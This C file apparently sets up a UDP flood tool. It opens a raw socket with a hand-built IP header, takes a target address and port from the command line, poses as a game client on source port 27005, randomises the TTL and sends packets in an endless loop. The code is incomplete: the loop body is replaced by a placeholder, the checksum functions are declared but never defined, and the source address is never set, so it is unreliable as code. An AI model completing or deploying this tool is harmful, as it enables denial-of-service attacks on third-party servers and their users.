#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

#define LEN 512
#define MAX 5000

typedef unsigned short u16;
typedef unsigned long u32;

//2nd
unsigned short csum (unsigned short *buf, int nwords);
uint16_t udp_checksum(const struct iphdr *ip, const struct udphdr *udp, const uint16_t *buf);

int main(int argc, char *argv[]) {

    if(argc < 3) {
        printf("- Usage %s <IP> <Port>\n", argv[0]);
        exit(1);
    }

    srand(time(NULL));  
    char *DEST = argv[1];
    int PSOURCE = 27005; // Inițializată corect
    int PDEST = atoi(argv[2]);
    int s;
    struct sockaddr_in daddr, saddr;
    char packet[LEN];
    struct iphdr *ip = (struct iphdr *)packet;  
    struct udphdr *udp = (struct udphdr *)((void *) ip + sizeof(struct iphdr));

    // Corectare IPPROTO_UDP
    if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
        perror("error:");
        exit(EXIT_FAILURE);
    }

    daddr.sin_family = AF_INET;
    saddr.sin_family = AF_INET;
    daddr.sin_port = htons(PDEST);
    inet_pton(AF_INET, DEST, (struct in_addr *)&daddr.sin_addr.s_addr);

    memset(daddr.sin_zero, 0, sizeof(daddr.sin_zero));
    memset(saddr.sin_zero, 0, sizeof(saddr.sin_zero));
    memset(udp, 0, sizeof(struct udphdr));
    memset(ip, 0, sizeof(struct iphdr));

    ip->ihl = 5; // header length
    ip->version = 4;
    ip->tos = 0;
    ip->id = 0;
    ip->frag_off = 0;  
    ip->ttl = 50 + (rand() % 50); // default value 
    ip->protocol = IPPROTO_UDP;  // corectat pentru UDP
    ip->check = 0;
    ip->daddr = daddr.sin_addr.s_addr;

    int sizedata = 25; // Inițializată corect
    int sizeudpdata = sizeof(struct udphdr) + sizedata;
    ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    
    udp->len = htons(sizeudpdata);

    // Opțiuni socket
    int optval = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(int)) < 0) {
        perror("IP HDRINCL");
    }

    PSOURCE = 27005; // Setarea corectă a portului sursă
    udp->source = htons(PSOURCE);
    saddr.sin_port = htons(PSOURCE);

    // Loop de trimitere pachete
    while(1) {
        // Restul codului din switch rămâne la fel, având grijă la variabile
        // ...
    }

    close(s);   
    exit(EXIT_SUCCESS);
}
